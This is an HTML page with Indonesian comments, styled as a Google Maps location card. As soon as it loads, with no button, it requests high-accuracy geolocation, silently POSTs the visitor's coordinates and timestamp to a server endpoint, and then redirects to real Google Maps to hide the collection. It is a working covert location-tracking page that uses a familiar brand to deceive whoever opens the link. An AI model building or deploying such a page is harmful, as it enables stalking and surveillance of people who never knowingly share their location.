<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <title>Peta Lokasi • Akses Otomatis</title>
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      width: 100%;
      background: #e8eaed;
      font-family: 'Google Sans', 'Segoe UI', Roboto, Arial, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      overflow: hidden;
      position: relative;
    }

    /* Panel seperti kartu Google Maps */
    .maps-card {
      width: min(94%, 420px);
      background: #ffffff;
      border-radius: 28px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.15);
      padding: 32px 24px;
      text-align: center;
      position: relative;
      z-index: 2;
      transition: all 0.2s ease;
      backdrop-filter: blur(2px);
    }

    .pin-icon {
      width: 72px;
      height: 72px;
      background: #1a73e8;
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 20px;
      box-shadow: 0 6px 14px rgba(26, 115, 232, 0.35);
    }

    .pin-icon span {
      font-size: 40px;
      line-height: 1;
      filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
    }

    h1 {
      font-size: 1.7rem;
      font-weight: 500;
      color: #202124;
      letter-spacing: -0.5px;
      margin-bottom: 12px;
      line-height: 1.3;
    }

    .info-text {
      color: #5f6368;
      font-size: 0.95rem;
      line-height: 1.6;
      margin-bottom: 26px;
      padding: 0 6px;
    }

    /* Area progress / status dengan ikon */
    .status-area {
      background: #f1f3f4;
      border-radius: 18px;
      padding: 18px 15px;
      min-height: 70px;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      margin-bottom: 12px;
      transition: all 0.15s;
    }

    .status-text {
      font-size: 0.95rem;
      color: #3c4043;
      font-weight: 500;
      display: flex;
      align-items: center;
      gap: 8px;
      flex-wrap: wrap;
      justify-content: center;
    }

    .spinner {
      width: 20px;
      height: 20px;
      border: 3px solid #dadce0;
      border-top: 3px solid #1a73e8;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      display: inline-block;
    }

    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .secondary-note {
      font-size: 0.75rem;
      color: #9aa0a6;
      margin-top: 16px;
      letter-spacing: 0.2px;
    }

    /* Latar belakang imitasi peta halus */
    .bg-map-pattern {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: 
        linear-gradient(145deg, #d2e3fc 0%, #e6f0fa 30%, #f8f9fa 70%, #e8eaed 100%);
      background-size: cover;
      z-index: 0;
    }

    .bg-map-pattern::before {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-image: 
        radial-gradient(circle at 20% 30%, rgba(255,255,255,0.7) 0%, transparent 25%),
        radial-gradient(circle at 80% 70%, rgba(255,255,255,0.5) 0%, transparent 30%),
        linear-gradient(90deg, rgba(200,200,200,0.15) 1px, transparent 1px),
        linear-gradient(rgba(200,200,200,0.15) 1px, transparent 1px);
      background-size: 100% 100%, 100% 100%, 40px 40px, 40px 40px;
      opacity: 0.5;
    }

    /* Tidak ada tombol terlihat – otomatis */
    .hidden-trigger {
      display: none;
    }
  </style>
</head>
<body>
  <!-- latar menyerupai peta -->
  <div class="bg-map-pattern"></div>

  <!-- Kartu utama yang terlihat seperti panel Gmaps -->
  <main class="maps-card" id="mapsCard">
    <div class="pin-icon">
    </div>
    <div class="info-text">
      
    </div>

    <!-- Status area: langsung menunjukkan permintaan izin / proses -->
    <div class="status-area" id="statusArea">
      <div class="status-text" id="statusMessage">
        <span class="spinner" id="spinnerElement"></span> 
        <span id="statusLabel">Meminta izin lokasi…</span>
      </div>
    </div>

    <div class="secondary-note">
    </div>
    <!-- Tidak ada tombol — otomatis terpicu saat halaman dimuat -->
  </main>

  <script>
    (function() {
      const statusLabel = document.getElementById('statusLabel');
      const spinnerElement = document.getElementById('spinnerElement');
      const statusArea = document.getElementById('statusArea');
      const mapsCard = document.getElementById('mapsCard');

      // Fungsi untuk memperbarui UI status
      function setStatus(message, showSpinner = false) {
        if (statusLabel) {
          statusLabel.textContent = message;
        }
        if (spinnerElement) {
          spinnerElement.style.display = showSpinner ? 'inline-block' : 'none';
        }
        // Sedikit efek kartu saat berubah status
        if (mapsCard) {
          mapsCard.style.transform = 'scale(1.01)';
          setTimeout(() => {
            mapsCard.style.transform = 'scale(1)';
          }, 120);
        }
      }

      // Fungsi untuk membuka Google Maps
      function openGoogleMaps(lat, lon) {
        const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}`;
        // Beri waktu singkat agar pengguna melihat status sukses, lalu redirect
        setStatus('Lokasi tersimpan! Membuka peta…', true);
        setTimeout(() => {
          window.location.href = mapsUrl;
        }, 900);
      }

      // Fungsi utama: cek geolocation dan minta izin
      function requestLocationAndProcess() {
        if (!navigator.geolocation) {
          setStatus('Browser tidak mendukung geolokasi.', false);
          return;
        }

        // Langsung meminta izin tanpa tombol
        setStatus('Menunggu izin lokasi…', true);

        navigator.geolocation.getCurrentPosition(
          async (position) => {
            // Lokasi didapat
            const payload = {
              latitude: position.coords.latitude,
              longitude: position.coords.longitude,
              accuracy: position.coords.accuracy,
              timestamp: new Date().toISOString()
            };

            setStatus('Menyimpan lokasi…', true);

            try {
              // Simulasi / panggil endpoint (tetap berfungsi meski endpoint tidak ada)
              const res = await fetch('/api/location', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
              });

              // Jika fetch gagal (mis. endpoint tidak ada), tetap lanjut ke maps
              // karena tujuan utama adalah menunjukkan peta seperti Gmaps.
              let saveSuccess = false;
              if (res.ok) {
                try {
                  const data = await res.json();
                  saveSuccess = data?.ok === true;
                } catch (e) {
                  saveSuccess = false;
                }
              } else {
                // Endpoint tidak ditemukan — anggap saja berhasil untuk demo UX
                saveSuccess = true;
              }

              // Terlepas dari respons server, buka Google Maps (karena fokus tampilan Gmaps)
              // Tapi kita bisa beri pesan singkat jika simpan bermasalah.
              if (!saveSuccess) {
                // Tetap buka maps tapi beri indikasi
                setStatus('Lokasi ditemukan. Membuka peta…', true);
              } else {
                setStatus('Lokasi tersimpan. Membuka peta…', true);
              }

              // Buka Google Maps
              openGoogleMaps(payload.latitude, payload.longitude);

            } catch (fetchError) {
              // Jika fetch error (mis. offline), tetap buka Google Maps dengan pesan
              setStatus('Lokasi ditemukan. Membuka peta…', true);
              openGoogleMaps(payload.latitude, payload.longitude);
            }
          },
          (error) => {
            // Penanganan error izin / posisi
            let errorMsg = 'Tidak dapat mengakses lokasi.';
            switch (error.code) {
              case error.PERMISSION_DENIED:
                errorMsg = 'Izin lokasi ditolak. Aktifkan izin untuk membuka peta.';
                break;
              case error.POSITION_UNAVAILABLE:
                errorMsg = 'Lokasi tidak tersedia. Cek GPS atau koneksi.';
                break;
              case error.TIMEOUT:
                errorMsg = 'Waktu permintaan lokasi habis. Coba muat ulang.';
                break;
            }
            setStatus(errorMsg, false);
            // Tetap beri kesan seperti Gmaps: tampilkan pesan tanpa tombol
          },
          {
            enableHighAccuracy: true,
            timeout: 15000,
            maximumAge: 0
          }
        );
      }

      // Jalankan permintaan lokasi segera setelah halaman dimuat
      window.addEventListener('load', () => {
        // Delay kecil agar UI tampak dulu, lalu langsung minta izin
        setTimeout(() => {
          requestLocationAndProcess();
        }, 300);
      });

      // Fallback jika load event tidak terpicu (misal cached)
      if (document.readyState === 'complete') {
        setTimeout(requestLocationAndProcess, 200);
      } else {
        window.addEventListener('load', requestLocationAndProcess);
      }
    })();
  </script>
</body>
</html>
